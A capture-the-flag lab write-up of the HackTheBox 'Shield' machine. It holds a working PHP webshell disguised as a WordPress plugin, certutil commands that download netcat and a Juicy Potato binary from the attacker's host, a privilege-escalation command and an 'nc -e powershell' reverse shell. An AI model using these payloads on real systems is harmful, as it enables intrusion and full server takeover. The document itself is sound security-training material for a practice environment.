# Shield (starting point)

## Enumeration

```bash
80/tcp   open  http    Microsoft IIS httpd 10.0
3306/tcp open  mysql   MySQL (unauthorized)
Microsoft Windows Server 2016 (91%)
```

```bash
gobuster dir -u 10.10.10.29 -w /usr/share/dirbuster-ng/wordlists/common.txt
```

> http://10.10.10.29/wordpress/wp-login.php

## Entry

We test every password found on previous machines:

> `admin` / `P@s5w0rd!` works

We can now plant a webshell as a wordpress plugin:

```php
<?php

/**
* Plugin Name: Shiny
* Plugin URI:
* Description: Sneaky
* Version: 1.4
* Author: Apehex
* Author URI: http://apehex.github.io
 */

$c=chr(99);if(isset($_GET[$c]))system($_GET[$c]); ?>
```

Activating the plugin triggers an error and reveals the location of the scripts:

> `/wordpress/wp-content/plugins/shiny-plugin/webshell.php`

I actually find this more comfortable than piping a cmd through `ncat` because
I can go back & forth with the browser history.

All the upcoming commands are actually executed via urls similar to:

`http://10.10.10.29/wordpress/wp-content/plugins/shiny-plugin/webshell.php?c=certutil -urlcache -split -f "http://10.10.16.47:8000/nc.exe" nc.exe`

I'll omit the base url for the sake of readability.

## Privilege Escalation

### Finding the vector

`whoami /priv` tells us that we have `SeImpersonatePrivilege` and `SeCreateGlobalPrivilege`
privileges.

We can run the [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) exploit.

### Transfering the material

But let's play a little more ^^

```
# attacker (BlackArch)
python -m http.server
# target (Windows)
certutil -urlcache -split -f "http://10.10.16.47:8000/winpeas.exe" winpeas.exe
certutil -urlcache -split -f "http://10.10.16.47:8000/nc.exe" nc.exe
certutil -urlcache -split -f "http://10.10.16.47:8000/juicy-potato.exe" js.exe
```

By curiosity, and to learn about other vectors, we launch `winpeas.exe`.

The report can be saved via the browser, which is yet another practical
advantage of using a webshell.

### The juicy exploit

The exploit is best described by [FoxGlove Security][floxglove-rotten-potato], I will only
describe the practical steps.

Since the command is long, we split it in 2 batch files, the wrapper which
elevates the privileges of the wrappee:

```
.\js.exe -t * -l 1337 -p .\ps.bat -c {d20a3293-3341-4ae8-9aaf-8e397cb63c34}
```

```
START .\nc.exe -e powershell.exe 10.10.16.47 1234
```

The CLSID that worked for me:

> `{d20a3293-3341-4ae8-9aaf-8e397cb63c34}`

From the admin powershell we can move to `C:\Users\Administrator\Desktop\` and
find the flag:

`type root.txt` (equivalent of cat)

[foxglove-rotten-potato]: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
